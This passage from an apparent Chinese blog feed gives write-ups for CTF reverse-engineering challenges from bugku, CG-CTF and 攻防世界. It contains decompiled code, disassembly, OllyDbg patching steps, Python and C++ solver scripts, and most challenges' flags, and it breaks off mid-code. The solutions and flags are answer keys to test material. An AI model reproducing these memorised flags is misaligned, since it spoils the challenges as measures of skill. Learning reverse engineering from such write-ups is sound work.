    <content type="html"><![CDATA[<p>这里记录一下bugku平台上一些re题的题解</p><a id="more"></a><h4 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h4><p>直接拖进IDA反编译</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpxsK.png" srcset="/img/loading.gif" alt="入门逆向-1"></p><p>直接可以看到flag</p><h4 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h4><p>IDA或OD反编译，搜索字符串</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpXxx.png" srcset="/img/loading.gif" alt="Easy_vb-1"><br>看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{}</p><h4 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h4><p>用OD调试，搜索字符串，找到需要我们输入字符串的位置：<br><img src="https://s2.ax1x.com/2020/02/13/1qpLGR.png" srcset="/img/loading.gif" alt="Easy_Re-1"><br>发现提示语和%s，找到输入字符串的位置，加断点单步调试<br><img src="https://s2.ax1x.com/2020/02/13/1qpOR1.png" srcset="/img/loading.gif" alt="Easy_Re-2"><br>程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag</p><h4 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h4><p>这题可以有至少三种解法：<br>1、第一种解法<br>直接游戏通关，很简单，依次输入1-8即可<br><img src="https://s2.ax1x.com/2020/02/13/1qpzqO.png" srcset="/img/loading.gif" alt="游戏过关-1"><br>2、使用OD修改程序<br>首先查找字符串找到输出flag关键函数<br><img src="https://s2.ax1x.com/2020/02/13/1q9pZD.png" srcset="/img/loading.gif" alt="游戏过关-2"><br>找到如图所示函数的起始地址，跳转两次找到关键判断<br><img src="https://s2.ax1x.com/2020/02/13/1q9CIH.png" srcset="/img/loading.gif" alt="游戏过关-3"><br>可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令<br><img src="https://s2.ax1x.com/2020/02/13/1q9iid.png" srcset="/img/loading.gif" alt="游戏过关-4"><br>直接运行程序，输入任意数字都可得到flag<br><img src="https://s2.ax1x.com/2020/02/13/1q9FJA.png" srcset="/img/loading.gif" alt="游戏过关-5"><br>3、进行解码解出flag<br>可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag</p><h4 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h4><p>下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag</p><h4 id="love"><a href="#love" class="headerlink" title="love"></a>love</h4><p>IDA打开反编译，找到输出部分<br><img src="https://s2.ax1x.com/2020/02/13/1qpvM6.png" srcset="/img/loading.gif" alt="love-1"><br>发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag</p><pre><code class="python">import base64s = &quot;e3nifIH9b_C@n@dH&quot;flag = &quot;&quot;for i in range(len(s)):    flag += chr(ord(s[i]) - i)flag = base64.b64decode(flag)print(flag)</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>bugku</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CGCTF-re部分题解</title>
    <link href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法</p><a id="more"></a><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello,RE!"></a>Hello,RE!</h4><p>打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag<br><img src="https://s2.ax1x.com/2020/02/13/1qp7a4.png" srcset="/img/loading.gif" alt="Hello,RE!-1"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><p>这题考的是直接读汇编的能力，代码贴在下面</p><pre><code class="c++">int main(int argc, char const *argv[]){  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};  func(input, 28);  printf(&quot;%s\n&quot;,input+1);  return 0;}</code></pre><pre><code class="asm">00000000004004e6 &lt;func&gt;:  4004e6: 55                    push   rbp  4004e7: 48 89 e5              mov    rbp,rsp  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1  4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  4004fd: 48 63 d0              movsxd rdx,eax  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]  400504: 48 01 d0              add    rax,rdx  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40050a: 48 63 ca              movsxd rcx,edx  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]  400511: 48 01 ca              add    rdx,rcx  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40051a: 31 ca                 xor    edx,ecx  40051c: 88 10                 mov    BYTE PTR [rax],dl  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]  400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;  40052a: 90                    nop  40052b: 5d                    pop    rbp  40052c: c3                    ret</code></pre><p>发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag</p><pre><code class="python">s = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,     0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,     0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66, 0x1c]for i in range(len(s)):    s[i] ^= iout = &#39;&#39;for i in range(len(s)):    out += chr(s[i])print(out)</code></pre><p>输出flag为：</p><pre><code class="flag">flag{read_asm_is_the_basic}</code></pre><h4 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h4><p>本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码</p><pre><code class="python">import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;</code></pre><p>研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp：</p><pre><code class="python">import base64correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;correct = str(base64.b64decode(correct))  # ^SdVkT#S ]`Y\\!^)\x8f\x80ism# print(correct)correct = &#39;^SdVkT#S ]`Y\\!^)\x8f\x80ism&#39;flag = &#39;&#39;for s in correct:    x = ord(s)    x -= 16    i = chr(x ^ 32)    flag += iprint(flag)</code></pre><p>输出flag为：</p><pre><code class="flag">nctf{d3c0mpil1n9_PyC}</code></pre><h4 id="WxyVM"><a href="#WxyVM" class="headerlink" title="WxyVM"></a>WxyVM</h4><p>下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下：</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v4; // [rsp+Bh] [rbp-5h]  signed int i; // [rsp+Ch] [rbp-4h]  puts(&quot;[WxyVM 0.0.1]&quot;);  puts(&quot;input your flag:&quot;);  scanf(&quot;%s&quot;, &amp;byte_604B80);  v4 = 1;  sub_4005B6();  if ( strlen(&amp;byte_604B80) != 24 )    v4 = 0;  for ( i = 0; i &lt;= 23; ++i )  {    if ( *(&amp;byte_604B80 + i) != dword_601060[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;}</code></pre><p>一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag</p><p>sub_4005B6()函数如下：</p><pre><code class="c++">__int64 sub_4005B6(){  unsigned int v0; // ST04_4  __int64 result; // rax  signed int i; // [rsp+0h] [rbp-10h]  char v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 14999; i += 3 )  {    v0 = byte_6010C0[i];    v3 = byte_6010C0[i + 2];    result = v0;    switch ( v0 )    {      case 1u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) += v3;        break;      case 2u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) -= v3;        break;      case 3u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= v3;        break;      case 4u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) *= v3;        break;      case 5u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]);        break;      default:        continue;    }  }  return result;}</code></pre><p>用IDA将byte_6010C0导出，用python进行逆向处理</p><pre><code class="python">s = [0xc4, 0x34, 0x22, 0xb1, 0xd3, 0x11, 0x97, 0x7, 0xdb, 0x37, 0xc4, 0x6, 0x1d, 0xfc, 0x5b, 0xed, 0x98, 0xdf, 0x94,0xd8, 0xb3, 0x84, 0xcc, 0x8]# dword与char比较，只取最后一位一个字节with open(&#39;export_results.txt&#39;) as f: #文件里是导出的byte_6010C0    t = f.read().split(&#39; &#39;)# print(len(t))for i in range(5000):    v0 = int(t[3 * (4999 - i)], 16)    v3 = int(t[3 * (4999 - i) + 2], 16)    result = int(t[3 * (4999 - i) + 1], 16)    if v0 == 1:        s[result] -= v3    elif v0 == 2:        s[result] += v3    elif v0 == 3:        s[result] ^= v3    elif v0 == 4:        s[result] /= v3    elif v0 == 5:        s[result] ^= s[v3]    else:        continueprint(&#39;&#39;.join([str(chr(int(i) % 128)) for i in s]))</code></pre><p>这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: </p><pre><code class="flag">nctf{Embr4ce_Vm_j0in_R3}</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>极其无聊的迷宫题……</p><p>找到地图、起点终点和上下左右分别对应的键就可以了</p><pre><code>nctf{o0oo00O000oooo..OO}</code></pre><h4 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h4><p>拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下：</p><pre><code class="C++">for ( i = 0; i &lt;= 24; ++i )  {    if ( *(&amp;byte_694100 + i) != dword_694060[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;</code></pre><p>所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下：</p><pre><code class="python">import rewith open(&#39;export_results.txt&#39;) as f:    s = &#39;&#39;    a = f.readline()    while a:        if re.match(r&#39;(.*)byte_6941(.*);&#39;, a):            s += a        a = f.readline()    with open(&#39;s.txt&#39;, &#39;w+&#39;) as ff:        s = s.split(&#39;\n&#39;)        n = len(s)        # print(len(s))        # print(s)        for i in range(n):            ff.write(s[n - 1 - i].strip() + &#39;\n&#39;)ss = [0xC0, 0x85, 0xF9, 0x6C, 0xE2, 0x14, 0xBB, 0xe4, 0xd, 0x59, 0x1c, 0x23, 0x88, 0x6e, 0x9b, 0xca, 0xba, 0x5c, 0x37,      0xfff, 0x48, 0xd8, 0x1f, 0xab, 0xa5]with open(&#39;s.txt&#39;) as f:    a = f.readline()    while a:        # print(re.match(r&#39;(.*)byte_6941(.*);&#39;, a).groups())        if not re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip():            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if s[1] == &#39;+=&#39;:                sub = &#39;-&#39;            elif s[1] == &#39;-=&#39;:                sub = &#39;+&#39;            else:                sub = &#39;^&#39;            if re.match(r&#39;(.*)u&#39;, s[2]):                s2 = re.match(r&#39;(.*)u&#39;, s[2]).group(1)            else:                s2 = s[2]            exp = i1 + sub + s2            ss[i] = eval(exp) % 128        else:            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;++&#39;:                sub = &#39;-&#39;            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;--&#39;:                sub = &#39;+&#39;            exp = i1 + sub + &#39;1&#39;            ss[i] = eval(exp) % 128        a = f.readline()    # print(ss)print(&#39;&#39;.join([str(chr(i % 128)) for i in ss]))</code></pre><p>这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。</p><p>运行程序输出flag：</p><pre><code class="flag">nctf{th3_vM_w1th0ut_dAta}</code></pre><h4 id="你大概需要一个优秀的mac"><a href="#你大概需要一个优秀的mac" class="headerlink" title="你大概需要一个优秀的mac"></a>你大概需要一个优秀的mac</h4><p>这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算</p><p>反编译出来的代码如下：</p><pre><code class="c++">  scanf(&quot;%s&quot;, &amp;v4);  if ( strlen(&amp;v4) != 56 )  {    puts((const char *)err);    exit(0);  }  __strcpy_chk(input, &amp;v4, 100LL);  func1((__int64)input);  xfun1();  xfun2();  xfun3();  xfun4();  xfun5();  check();//func1  for ( i = 0; i &lt; 57; ++i ) //这里应该是56？  {    *(_BYTE *)(a1 + i) ^= 0xDEu;  }//xfun1  for ( i = 0; i &lt; 10; ++i )  {    input[i] ^= 0xADu;  }//xfun2  for ( i = 0; i &lt; 10; ++i )  {    input[i + 10] ^= 0xBEu;  }//xfun3  for ( i = 0; i &lt; 10; ++i )  {    input[i + 20] ^= 0xEFu;  }//xfun4  for ( i = 0; i &lt; 10; ++i )  {    input[i + 30] ^= 0xABu;  }//xfun5  for ( i = 0; i &lt; 16; ++i )  {    input[i + 40] ^= 0xEFu;  }//check  memcpy(v2, &amp;byte_100000ED0, 0xE0uLL);  for ( i = 0; i &lt; 56; ++i )  {    if ( (char)input[i] != v2[i] )    {      puts((const char *)err);      exit(0);    }  }</code></pre><p>所以将byte_100000ED0处的数组导出，进行逆运算，代码如下：</p><pre><code class="python">s = [0x15, 0x1F, 0x12, 0x14, 0x08, 0x3A, 0x46, 0x2C, 0x07, 0x1B, 0x51, 0x13, 0x3F, 0x57, 0x08, 0x05, 0x3F, 0x30, 0x32,     0x51, 0x52, 0x02, 0x6E, 0x78, 0x16, 0x7C, 0x6E, 0x61, 0x70, 0x48, 0x1C, 0x3B, 0x32, 0x2A, 0x13, 0x45, 0x07, 0x2A,     0x18, 0x0C, 0x6E, 0x41, 0x70, 0x04, 0x06, 0x6E, 0x5C, 0x00, 0x42, 0x45, 0x70, 0x5A, 0x02, 0x04, 0x0E, 0x4C]for i in range(10):    s[i]^=0xADfor i in range(10,20):    s[i]^=0xBEfor i in range(20,30):    s[i]^=0xEFfor i in range(30,40):    s[i]^=0xABfor i in range(40,56):    s[i]^=0xEFfor i in range(56):    s[i]^=0xDEprint(&#39;&#39;.join([str(chr(i%128)) for i in s]))</code></pre><p>运行程序输出flag：</p><pre><code class="flag">flag{I5_th1s_7he_PR1c3_I&#39;M_PAyiNG_f0r_my_pA57_m1stAk35?}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>CG-CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解</title>
    <link href="/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。</p><a id="more"></a><h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  unsigned int v3; // eax  unsigned int v4; // eax  puts(&quot;Reticulating splines, please wait..&quot;);  sleep(5u);  v3 = time(0);  srand(v3);  v4 = rand();  puts((&amp;strs)[v4 % 0xA]);  return 0;}</code></pre><p>找到strs，其中flag</p><pre><code>9447{This_is_a_flag}</code></pre><h4 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h4><p>这题真就连源代码都给了</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) {    if (argc != 4) {        printf(&quot;what?\n&quot;);        exit(1);    }    unsigned int first = atoi(argv[1]);    if (first != 0xcafe) {        printf(&quot;you are wrong, sorry.\n&quot;);        exit(2);    }    unsigned int second = atoi(argv[2]);    if (second % 5 == 3 || second % 17 != 8) {        printf(&quot;ha, you won&#39;t get it!\n&quot;);        exit(3);    }    if (strcmp(&quot;h4cky0u&quot;, argv[3])) {        printf(&quot;so close, dude!\n&quot;);        exit(4);    }    printf(&quot;Brr wrrr grr\n&quot;);    unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre><p>看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。</p><p>不过还需要注意，最后输出的时候是以16进制的形式输出</p><pre><code>c0ffee</code></pre><h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h4><p>题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag</p><pre><code>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</code></pre><h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA打开，找到关键判断位置</p><pre><code class="c++">strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);  v7 = &#39;ebmarah&#39;;  v6 = 7;  printf(&quot;Welcome to the RC3 secure password guesser.\n&quot;, a2, a3);  printf(&quot;To continue, you must enter the correct password.\n&quot;);  printf(&quot;Enter your guess: &quot;);  __isoc99_scanf(&quot;%32s&quot;, s);  v3 = strlen(s);  if ( v3 &lt; strlen(v8) )    sub_4007C0(v8);  for ( i = 0; i &lt; strlen(s); ++i )  {    if ( i &gt;= strlen(v8) )      ((void (*)(void))sub_4007C0)();    if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )      ((void (*)(void))sub_4007C0)();  }</code></pre><p>v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了</p><pre><code class="python">v8 = &#39;:\&quot;AL_RT^L*.?+6/46&#39;v7 = &#39;harambe&#39;s = &#39;&#39;for i in range(len(v8)):    s += chr(ord(v7[i % 7]) ^ ord(v8[i]))print(s)</code></pre><p>输出结果</p><pre><code>RC3-2016-XORISGUD</code></pre><h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h4><p>见CG-CTF py交易</p><h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>见BUGKU 游戏过关</p><h4 id="hello-ctf"><a href="#hello-ctf" class="headerlink" title="hello-ctf"></a>hello-ctf</h4><p>一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了</p><pre><code class="python">s = &#39;437261636b4d654a757374466f7246756e&#39;flag = bytes.fromhex(s)print(flag)</code></pre><p>直接输出flag</p><pre><code>CrackMeJustForFun</code></pre><h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>同样是一道简单题，写个简单的逆运算就可以了</p><pre><code class="python">s = &#39;c61b68366edeb7bdce3c6820314b7498&#39;t = &#39;&#39;v5 = 0while (v5 &lt; len(s)):    if (v5 &amp; 1):        v3 = 1    else:        v3 = -1    t += chr(ord(s[v5]) + v3)    v5 = v5 + 1t=&#39;SharifCTF{&#39;+t+&#39;}&#39;print(t)</code></pre><p>输出flag</p><pre><code>SharifCTF{b70c59275fcfa8aebf2d5911223c6589}</code></pre><h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可</p><pre><code>DUTCTF{We1c0met0DUTCTF}</code></pre><h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h4><p>这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用<code>x/6sw $eax</code>来查看，结果发现了flag</p><pre><code>9447{you_are_an_international_mystery}</code></pre><h4 id="csaw2013reversing3"><a href="#csaw2013reversing3" class="headerlink" title="csaw2013reversing3"></a>csaw2013reversing3</h4><p>这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。</p><pre><code>flag{reversing_is_not_that_hard!}</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>见CG-CTF maze</p><h4 id="666"><a href="#666" class="headerlink" title="666"></a>666</h4><p>IDA打开看到了假flag，不管它，找到关键函数</p><pre><code class="c++">int __fastcall encode(const char *a1, __int64 a2){  char v3[32]; // [rsp+10h] [rbp-70h]  char v4[32]; // [rsp+30h] [rbp-50h]  char v5[40]; // [rsp+50h] [rbp-30h]  int v6; // [rsp+78h] [rbp-8h]  int i; // [rsp+7Ch] [rbp-4h]  i = 0;  v6 = 0;  if ( strlen(a1) != key )    return puts(&quot;Your Length is Wrong&quot;);  for ( i = 0; i &lt; key; i += 3 )  {    v5[i] = key ^ (a1[i] + 6);    v4[i + 1] = (a1[i + 1] - 6) ^ key;    v3[i + 2] = a1[i + 2] ^ 6 ^ key;    *(_BYTE *)(a2 + i) = v5[i];    *(_BYTE *)(a2 + i + 1LL) = v4[i + 1];    *(_BYTE *)(a2 + i + 2LL) = v3[i + 2];  }  return a2;}</code></pre><p>这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    int key = 0x12;    unsigned char a2[] =            {                    0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77,                    0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69            };    char a1[key+1];    for (int i = 0; i &lt; key; i += 3 )    {        a1[i]=(a2[i]^key)-6;        a1[i+1]=(a2[i+1]^key)+6;        a1[i+2]=a2[i+2]^key^6;    }    cout&lt;&lt;a1&lt;&lt;endl;    return 0;}</code></pre><p>输出的flag为：</p><pre><code>unctf{b66_6b6_66b}</code></pre><h4 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h4><p>没什么难度，找到关键函数</p><pre><code class="c++">signed __int64 __fastcall sub_4006FD(__int64 a1){  signed int i; // [rsp+14h] [rbp-24h]  const char *v3; // [rsp+18h] [rbp-20h]  const char *v4; // [rsp+20h] [rbp-18h]  const char *v5; // [rsp+28h] [rbp-10h]  v3 = &quot;Dufhbmf&quot;;  v4 = &quot;pG`imos&quot;;  v5 = &quot;ewUglpt&quot;;  for ( i = 0; i &lt;= 11; ++i )  {    if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 )      return 1LL;  }  return 0LL;}</code></pre><p>a1就是我们需要的flag了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    char v3[3][8] = {&quot;Dufhbmf&quot;, &quot;pG`imos&quot;, &quot;ewUglpt&quot;};    char a1[13];    for (int i = 0; i &lt;= 11; ++i) {        a1[i] = v3[i % 3][2 * (i / 3)] - 1;    }    cout&lt;&lt;a1&lt;&lt;endl;    return 0;}</code></pre><p>输出的flag为：</p><pre><code>Code_Talkers</code></pre><h4 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h4><p>IDA打开，首先发现flag的格式，<code>EIS{***}</code></p><p>找到关键函数</p><pre><code class="c++">bool __cdecl sub_4011C0(char *a1){  size_t v2; // eax  signed int v3; // [esp+50h] [ebp-B0h]  char v4[32]; // [esp+54h] [ebp-ACh]  int v5; // [esp+74h] [ebp-8Ch]  int v6; // [esp+78h] [ebp-88h]  size_t i; // [esp+7Ch] [ebp-84h]  char v8[128]; // [esp+80h] [ebp-80h]  if ( strlen(a1) &lt;= 4 )    return 0;  i = 4;  v6 = 0;  while ( i &lt; strlen(a1) - 1 )    v8[v6++] = a1[i++];  v8[v6] = 0;  v5 = 0;  v3 = 0;                                       // v8=a1  memset(v4, 0, 0x20u);  for ( i = 0; ; ++i )  {    v2 = strlen(v8);    if ( i &gt;= v2 )      break;    if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )    {      v8[i] -= 32;      v3 = 1;    }    if ( !v3 &amp;&amp; v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39; )      v8[i] += 32;                                //大小写互换    v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]);    //唯一一步有用的计算    v3 = 0;  }  return strcmp(&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;, v4) == 0;</code></pre><p>据此写脚本逆向</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    string v4=&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;;    unsigned char byte_4420B0[] =            {                    13,  19,  23,  17,   2,   1,  32,  29,  12,   2,                    25,  47,  23,  43,  36,  31,  30,  22,   9,  15,                    21,  39,  19,  38,  10,  47,  30,  26,  45,  12,                    34,   4            };    char v8[v4.length()];    for (int i = 0;i&lt;v4.length() ; ++i )    {        v8[i]=((v4[i]^byte_4420B0[i])-72)^0x55;        if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )        {            v8[i] -= 32;        } else if(v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39;){            v8[i] += 32;        }        else{            continue;        }    }    cout&lt;&lt;v8&lt;&lt;endl;    return 0;}</code></pre><p>把输出和我们已知的部分结合起来得到flag</p><pre><code>EIS{wadx_tdgk_aihc_ihkn_pjlm}</code></pre><h4 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h4><p>通过字符串找到关键部分</p><pre><code class="c++">__int64 __fastcall sub_400F8E(__int64 a1, __int64 a2){  __int64 v2; // rdx  __int64 v3; // rcx  __int64 v4; // r8  __int64 v5; // r9  int index; // eax  char v8[136]; // [rsp+10h] [rbp-B0h]  int v9; // [rsp+98h] [rbp-28h]  char v10; // [rsp+9Fh] [rbp-21h]  int v11; // [rsp+A0h] [rbp-20h]  unsigned __int8 v12; // [rsp+A6h] [rbp-1Ah]  char v13; // 